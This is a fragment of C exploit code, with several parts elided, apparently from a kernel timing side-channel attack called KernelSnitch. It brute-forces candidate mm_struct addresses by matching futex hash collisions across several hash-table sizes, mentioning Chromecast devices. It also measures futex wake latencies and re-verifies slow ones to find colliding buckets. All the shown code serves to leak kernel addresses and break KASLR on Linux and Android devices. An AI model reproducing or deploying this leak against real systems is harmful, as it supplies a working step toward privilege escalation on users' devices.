    ...
    for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
        ...
        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
                ...
                size_t found_hash = 0;
                if (!ks->mte_enabled) {
                    /* Try multiple hashsizes since alloc_large_system_hash
                     * shrinks on low-memory systems (2GB Chromecast: 64-128). */
                    static const uint32_t try_hs[] = {64, 128, 256, 512, 1024, 2048};
                    for (size_t hi = 0; hi < sizeof(try_hs)/sizeof(try_hs[0]) && !found_hash; hi++) {
                        found_hash = 1;
                        for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                            found_hash = (__futex_hash_with_mm(ks->futex_addrs[0], mm_struct_candidate, try_hs[hi]) ==
                                          __futex_hash_with_mm(ks->futex_addrs[i], mm_struct_candidate, try_hs[hi]));
                    }
                    if (found_hash) {
...
#define KERNELSNITCH_THRESHOLD_MULT 10
    ...
    for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
        ...
        if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
            /* VERIFY before accepting: a WAKE on a genuine pile-bucket
             * collision walks (and wakes) all 4096 pile threads, whose
             * re-wait storm jitters the following measurements - without
             * re-verification the set is noise-dominated and NO mm in the
             * linear map can satisfy the resulting constraint set (the
             * bruteforce then always returns -1). A genuine collision
             * measures slow CONSISTENTLY once the pile has re-queued;
             * jitter spikes do not. */
            int verified = 1;
            for (int v = 0; v < 3; v++) {
                usleep(2000);
                if (__measure(futex_addr) <= (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
                    verified = 0;
                    break;
                }
            }
            ...
            if (ks->verbose) pr_info("  %016zx (verified)\n", futex_addr);
        }
    }
    if (wanted == count) {
